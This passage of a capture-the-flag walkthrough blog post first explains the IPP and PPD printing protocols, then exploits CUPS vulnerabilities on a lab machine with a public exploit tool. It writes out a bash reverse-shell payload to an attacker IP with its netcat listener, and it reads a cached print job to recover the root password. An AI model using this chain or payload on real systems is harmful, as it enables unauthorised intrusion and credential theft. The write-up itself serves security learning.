+<li>IPP can restrict access to certain users or devices, enhancing security in environments with multiple users.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Common Use</strong>:</p>
+<ul>
+<li>IPP is used in most modern networked printers and printing systems (like CUPS) due to its flexibility, security features, and ability to handle complex printing tasks.</li>
+<li>IPP&rsquo;s versatility and security make it a preferred protocol for managing printers, especially in networked environments</li>
+</ul>
+</li>
+</ul>
+<h4 id="postscript-printer-description--ppd--primer">PostScript Printer Description (PPD) Primer:</h4>
+<ul>
+<li>
+<p><strong>What is a PPD File?</strong></p>
+<ul>
+<li>A PostScript Printer Description (PPD) file is a configuration file used by printing systems to describe the capabilities and features of a PostScript printer.</li>
+<li>PPD files provide detailed information about the printer&rsquo;s features, such as supported paper sizes, resolution, duplexing, and more.</li>
+<li>A PPD contains the PostScript commands (code) which is used to invoke features for the print job handled by that printer.</li>
+</ul>
+</li>
+<li>
+<p><strong>Purpose of a PPD File</strong>:</p>
+<ul>
+<li><strong>Printer Configuration</strong>:
+<ul>
+<li>PPD files allow the operating system and printing system (e.g., CUPS) to configure the printer correctly.</li>
+</ul>
+</li>
+<li><strong>Feature Customization</strong>:
+<ul>
+<li>They describe optional features like trays, memory, or color modes, enabling users to select these features during printing.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Structure of a PPD File</strong>:</p>
+<ul>
+<li><strong>Header</strong>:
+<ul>
+<li>Contains general information about the printer, such as its model name, manufacturer, and supported languages.</li>
+</ul>
+</li>
+<li><strong>Printer Capabilities</strong>:
+<ul>
+<li>Details the specific print features like:
+<ul>
+<li>Supported page sizes (e.g., A4, Letter)</li>
+<li>Print resolution (e.g., 600 DPI, 1200 DPI)</li>
+<li>Duplex printing capabilities (automatic double-sided printing)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Option Keywords</strong>:
+<ul>
+<li>Defines selectable options for users, such as media types, color modes, or finishing options like stapling or punching.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>How a PPD File Works</strong>:</p>
+<ul>
+<li>When a print job is initiated, the PPD file helps the system translate the print request into a format the printer can understand.</li>
+<li>It provides the necessary instructions for the printer driver to produce the correct output by interpreting the selected options (resolution, paper size, etc.).</li>
+</ul>
+</li>
+<li>
+<p><strong>Common Use Cases</strong>:</p>
+<ul>
+<li><strong>PostScript Printers</strong>:
+<ul>
+<li>Primarily used for configuring PostScript printers, but they can also be used by CUPS to manage non-PostScript printers by mapping specific print features.</li>
+</ul>
+</li>
+<li><strong>Driver Customization</strong>:
+<ul>
+<li>Often included with printer drivers or downloaded from the printer manufacturer’s website, ensuring that all printer features are available to the user.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Security and Maintenance</strong>:</p>
+<ul>
+<li><strong>Misconfiguration Issues</strong>:
+<ul>
+<li>Incorrect or outdated PPD files may lead to misconfiguration of print jobs, causing print failures or reduced functionality.</li>
+</ul>
+</li>
+<li><strong>Modifications</strong>:
+<ul>
+<li>PPD files can be edited manually to customize printer behavior, though improper editing may lead to errors or printing issues.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="attack-chain">Attack Chain:</h3>
+<ul>
+<li>
+<p><strong>If you would like a deeper dive: I have written a deep dive of this exploitation chain which you can find here</strong>:</p>
+<ul>
+<li>+Deep Dive+: <a href="https://bloodstiller.com/articles/understandingcupsexploitation">https://bloodstiller.com/articles/understandingcupsexploitation</a></li>
+</ul>
+</li>
+<li>
+<p><strong>Attack Chain Summarized</strong>:</p>
+<ul>
+<li>Force the target machine to connect back to our malicious <code>IPP</code> server by sending a crafted packet to port <code>631</code> thereby starting the process of creating a fake printer.</li>
+<li>Return a malicious <code>IPP</code> attribute string to inject our controlled <code>PPD</code> directives to the temporary file.</li>
+<li>Either print a test page from our fake printer if we have access to the <code>CUPS</code> web panel to trigger the <code>PPD</code> directives (and our commands) to be executed or wait for a print job to be sent to the fake printer.</li>
+</ul>
+</li>
+</ul>
+<h2 id="2-dot-foothold">2. Foothold:</h2>
+<h3 id="exploiting-the-cups-vulnerabilities-to-get-a-low-privilege-shell">Exploiting the CUPS vulnerabilities to get a low privilege shell:</h3>
+<h4 id="preparing-the-cups-exploit">Preparing the CUPS Exploit:</h4>
+<ul>
+<li>
+<p><strong>I will be using ippsec&rsquo;s cups exploit for this attack</strong>:</p>
+<ul>
+<li><a href="https://github.com/ippsec/evil-cups">https://github.com/ippsec/evil-cups</a></li>
+</ul>
+</li>
+<li>
+<p><strong>Preparing Exploit</strong>:</p>
+<ul>
+<li><code>git clone https://github.com/IppSec/evil-cups.git</code></li>
+<li><code>cd evil-cups</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Prepare Python Venv</strong>:</p>
+<ul>
+<li><code>python3 -m venv evilCups</code></li>
+<li><code>source evilCups/bin/activate</code></li>
+<li>+Note+: I use venv&rsquo;s as it allows me to install different deps without causing conflicts with my base python installation.</li>
+</ul>
+</li>
+<li>
+<p><strong>Install Requirements</strong>:</p>
+<ul>
+<li><code>pip3 install -r requirements.txt</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="running-the-cups-exploit">Running the CUPS Exploit:</h4>
+<ol>
+<li>
+<p><strong>Running the exploit to send the payload</strong>:</p>
+<ul>
+<li><code>python3 evilcups.py [AttackIP] [VictimIP] &quot;bash -c 'bash -i &gt;&amp; /dev/tcp/[AttackIP]/[AttackPort] 0&gt;&amp;1'&quot;</code></li>
+<li><code>python3 evilcups.py 10.10.14.58 $box &quot;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.58/443 0&gt;&amp;1'&quot;</code></li>
+<li><figure><img src="/ox-hugo/2024-10-22-095213_.png">
+</figure>
+</li>
+<li>Now the payload is sent we can move onto the next stage of triggering the exploit:</li>
+</ul>
+</li>
+<li>
+<p><strong>Start our listener</strong>:</p>
+<ul>
+<li><code>rlwrap -cAr nc -lnvp 443</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Trigger the exploit</strong>:</p>
+<ul>
+<li>
+<p>Navigating the CUPS web-console we can see our malicious printer is listed:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-22-090825_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Printing our test page to trigger the exploit</strong>:</p>
+<ul>
+<li>In order to activate the exploit and trigger the malicious PPD directives we need to either wait for a print job to be sent to the fake printer or we can trigger one ourselves using the &ldquo;<code>Test Print</code>&rdquo; functionality.</li>
+<li><figure><img src="/ox-hugo/2024-10-22-090909_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Low Priv Shell Caught</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-22-095152_.png">
+</figure>
+</li>
+<li><figure><img src="/ox-hugo/2024-10-22-095738_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Get our User Flag</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-22-095757_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="3-dot-privilege-escalation">3. Privilege Escalation:</h2>
+<h3 id="reading-cached-print-queues-to-retrieve-the-root-password">Reading Cached Print Queues to retrieve the Root Password:</h3>
+<ul>
+<li>
+<p><strong>Checking for print jobs in the CUPS web console</strong>:</p>
+<ul>
+<li>As this is a printer based machine lets check if there are any interesting print jobs.</li>
+<li>Navigating to the web-console &amp; clicking on Jobs we can see a single job is listed for the authentic printer <code>Canon_MB2300_series</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-22-102833_.png">
+</figure>
+</li>
+<li>You may notice the <code>-1</code> after this tells us this is the first print job for this printer. (more on this soon)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Trying to read the cached Jobs</strong>:</p>
+<ul>
+<li><code>CUPS</code> keeps it&rsquo;s cached jobs in the default location: <code>/var/spool/cups/</code> however when I try and list the contents of the folder I get the following error:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-22-112040_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Discovering we have executable rights over the folder</strong>:</p>
+<ul>
+<li>Listing the contents of <code>/var/spools</code> we can see we have execute privileges on the <code>cups</code> directory but we cannot list the contents:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-22-112104_.png">
+</figure>
+</li>
+<li>This means if we can establish the file-name for any files in the folder we can execute <code>cat</code> etc on the file to list the contents.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Default naming structure format for cached Print jobs</strong>:</p>
+<ul>
+<li>The naming structure for completed jobs in the <code>cups</code> directory is as follows:
+<ul>
+<li><code>d-[print job]-[page number]</code>
+<ul>
+<li><code>d</code> = The cached print job files in the CUPS directory are always prefixed with &ldquo;d&rdquo;.</li>
+<li>Print job = 5 digits (e.g. <code>00001</code>)</li>
+<li>Page number = 3 digits (e.g. <code>001</code>)</li>
+</ul>
+</li>
+<li>As we know there is only 1 printer, <code>Canon_MB2300_series</code> &amp; it had only 1 job (see below) therefore we can infer the file will be called <code>d00001-001</code>.
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-22-112926_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Extracting the root password from the cached job</strong>:</p>
+<ul>
+<li>
+<p><code>cat /var/spool/cups/d00001-001</code></p>
+</li>
+<li>
+<figure><img src="/ox-hugo/2024-10-22-113055_.png">
+</figure>
+
+</li>
+<li>
+<p>Scrolling down we can get root users pass:</p>
+</li>
+<li>
+<figure><img src="/ox-hugo/2024-10-22-100359_.png">
+</figure>
+
+</li>
+<li>
+<p>+Note+: This is very CTF, but I don&rsquo;t mind.</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="4-dot-ownership">4. Ownership:</h2>
+<h3 id="ssh-ing-as-root-to-get-the-root-flag">SSH&rsquo;ing As Root to get the root flag:</h3>
+<ul>
+<li>
+<p><strong>SSH back in as root</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-22-100444_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Get Root Flag</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-22-100548_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="lessons-learned">Lessons Learned:</h2>
+<h3 id="what-did-i-learn">What did I learn?</h3>
+<ol>
+<li>Reading the <a href="https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/">https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/</a> I learned ALOT about CUPS, PPD, IPP etc.</li>
+</ol>
+<h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
+<ol>
+<li>Forgot a closing quotation mark a few times, that was fun.</li>
+</ol>
+<h2 id="sign-off">Sign off:</h2>
+<p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
+<p>Until next time, hack the planet!</p>
+<p>– Bloodstiller</p>
+<p>– Get in touch bloodstiller at proton dot me</p>
+
+            
+        </div>
+    </article>
+
+        </main>
+
+        <footer class="footer">
+    <div class="footer-left">
+        <ul class="social">
+            
+                <li>All Rights Reserved ®.</li>
+            
+
+            
+                <li>Bloodstiller</li>
+            
+
+            
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://github.com/bloodstiller" target="_blank">
+                                <i class="bi-github"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        </ul>
+    </div>
+
+    <div class="footer-right">
+        <ul class="control status clearfix">
+            
+                <li>
+                    
+                        Word Count:
+                        2020
+                    
+                </li>
+            
+
+
+            
+                <li>en</li>
+            
+
+            
+
+            
+
+            
+                <li>
+                    
+                        Last modified: &nbsp;
+                        <time>
+                            Oct 22 2024 00:00:00
+                        </time>
+                    
+                </li>
+            
+
+            
+        </ul>
+    </div>
+</footer>
+
+    </body>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
+            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
+            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
+            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
+            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />
+
+
+
+
+</html>
